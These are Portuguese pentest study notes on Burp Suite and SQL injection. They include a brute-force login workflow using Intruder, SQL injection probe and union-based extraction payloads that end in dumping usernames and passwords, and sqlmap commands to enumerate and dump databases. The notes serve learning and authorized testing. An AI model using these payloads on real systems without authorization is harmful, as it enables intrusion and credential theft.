Segue cada um no mesmo formato dos seus arquivos — pode salvar como .md individual em 08-Exploracao ou criar uma pasta nova tipo 09-Web-App-Pentest e 14-Password-Cracking.

markdown
# 🕷️ Burp Suite — Proxy de Interceptação Web

> Burp Suite é a ferramenta central de qualquer teste em aplicação web.
> Ele se posiciona entre o navegador e o servidor, permitindo interceptar, inspecionar e modificar cada requisição HTTP antes que ela chegue ao destino.

---

## 🧠 O Que é o Burp Suite

Um **proxy de interceptação** que atua como man-in-the-middle entre o cliente (navegador) e o servidor web, dando controle total sobre as requisições e respostas HTTP/HTTPS.

**Fluxo conceitual:**

Navegador → Burp Proxy (127.0.0.1:8080) → Servidor
↓
Requisição interceptada
(visualizar / editar / repetir / automatizar)


---

## 🔧 Configuração Inicial

### 1. Configurar proxy no navegador

Endereço: 127.0.0.1
Porta: 8080


### 2. Instalar certificado do Burp (para HTTPS)

Acessar http://burp no navegador com o proxy ativo
→ Baixar certificado CA
→ Importar nas autoridades certificadoras confiáveis do navegador


### 3. Confirmar interceptação

Proxy → Intercept → Intercept is on
Navegar até o alvo → requisição deve aparecer travada no Burp


---

## 🧰 Módulos Principais

| Módulo | Função |
|---|---|
| **Proxy** | Intercepta e exibe requisições/respostas em tempo real |
| **Target / Site map** | Mapeia estrutura da aplicação conforme você navega |
| **Repeater** | Reenvia manualmente uma requisição capturada, editando parâmetros à vontade |
| **Intruder** | Automatiza ataques (brute force, fuzzing) usando listas de payload |
| **Decoder** | Codifica/decodifica dados (Base64, URL, Hex) |
| **Comparer** | Compara duas respostas lado a lado |

---

## 🎯 Repeater — Uso Prático
Interceptar requisição no Proxy
Botão direito → Send to Repeater
Editar parâmetro (ex: id=1 → id=1' OR '1'='1)
Send
Analisar resposta (tamanho, status code, conteúdo)

---

## ⚔️ Intruder — Tipos de Ataque

| Tipo | Comportamento |
|---|---|
| **Sniper** | Um payload por vez, em uma posição marcada |
| **Battering ram** | Mesmo payload em todas as posições simultaneamente |
| **Pitchfork** | Payloads diferentes, sincronizados por posição |
| **Cluster bomb** | Todas as combinações entre múltiplas listas de payload |

**Workflow típico de brute force de login:**
Interceptar requisição de login
Send to Intruder
Marcar posição do parâmetro (username ou password) com §
Attack type: Sniper
Payloads → carregar wordlist
Start attack
Ordenar por Status Code / Length para achar a resposta diferente

---

## 📌 Relacionados

- [[SQL Injection]]
- [[Cross-Site Scripting (XSS)]]
- [[Hydra]]
- [[Nmap — Visão Geral]]

#web #burpsuite #proxy #enumeracao
markdown
# 💉 SQL Injection — Exploração de Bancos de Dados via Input

> SQL Injection ocorre quando input do usuário é concatenado diretamente numa query SQL sem sanitização, permitindo alterar a lógica da consulta original.
> É uma das vulnerabilidades mais críticas e mais cobradas em qualquer avaliação de aplicação web.

---

## 🧠 O Que é SQL Injection

Quando a aplicação monta uma query assim:
```sql
SELECT * FROM users WHERE username = '$input' AND password = '$senha'
```

E o input não é sanitizado, um atacante pode quebrar a estrutura da query inserindo aspas e lógica SQL própria.

---

## 🔢 Tipos de SQL Injection

| Tipo | Como funciona | Visibilidade |
|---|---|---|
| In-band (Union-based) | Resultado aparece direto na resposta HTTP | Alta |
| Error-based | Mensagens de erro do banco revelam estrutura | Alta |
| Blind (Boolean) | Sem erro visível, só muda o comportamento (true/false) | Baixa |
| Blind (Time-based) | Usa `SLEEP()` pra inferir resposta pelo tempo | Baixa |

---

## 🔍 Identificação Manual

```sql
' 
"
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin' --
```

**Sinais de vulnerabilidade:**
Erro de sintaxe SQL retornado na página
Comportamento diferente entre ' e ''
Login bypassed com ' OR '1'='1
Resposta muda com AND 1=1 vs AND 1=2

---

## 🎯 Union-Based — Passo a Passo

### 1. Descobrir número de colunas
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   ← erro aqui = 2 colunas na query
```

### 2. Confirmar colunas visíveis na resposta
```sql
' UNION SELECT null,null-- -
```

### 3. Extrair informação do banco
```sql
' UNION SELECT database(),version()-- -
' UNION SELECT table_name,null FROM information_schema.tables-- -
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password FROM users-- -
```

---

## 🤖 Automatizando com SQLMap

```bash
# Testar e identificar o parâmetro vulnerável
sqlmap -u "http://alvo/page.php?id=1"

# Listar bancos de dados
sqlmap -u "http://alvo/page.php?id=1" --dbs

# Listar tabelas de um banco
sqlmap -u "http://alvo/page.php?id=1" -D nome_db --tables

# Dump de uma tabela
sqlmap -u "http://alvo/page.php?id=1" -D nome_db -T users --dump

# Requisição via POST (form de login, por exemplo)
sqlmap -u "http://alvo/login.php" --data="user=admin&pass=teste" -p user

# Usando um request capturado do Burp
sqlmap -r requisicao.txt --dbs
```

---

## ⚠️ Detecção e Defesa
Prepared statements / queries parametrizadas (defesa definitiva)
WAF pode bloquear payloads óbvios (mas é bypassável)
Logs de banco mostram queries anômalas
Least privilege no usuário do banco usado pela aplicação

---

## 📌 Relacionados

- [[Burp Suite]]
- [[MySQL com Metasploit]]
- [[MSSQL EXPLOIT ESCALATION]]

#web #sqlinjection #owasp #exploração